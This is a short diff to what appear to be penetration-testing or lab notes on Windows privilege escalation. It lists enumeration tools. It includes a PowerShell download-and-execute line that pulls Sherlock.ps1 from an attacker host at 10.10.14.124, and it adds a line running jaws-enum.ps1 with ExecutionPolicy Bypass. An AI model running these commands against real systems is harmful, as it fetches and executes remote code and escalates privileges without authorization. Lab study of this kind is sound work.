@@ -22,6 +22,7 @@ WinPrivCheck by ihack4falafel
 Sherlock – New one is Watson
 ```
 PS C:\inetpub\drupal-7.54> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.124:8000/Sherlock.ps1') ; Find-AllVulns
+C:\inetpub\drupal-7.54>powershell.exe -ExecutionPolicy Bypass -File jaws-enum.ps1
 ```
 PentestMonkey Windows-privesc-check is standalone executable that runs on Windows systems. It tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps (e.g. databases).
 
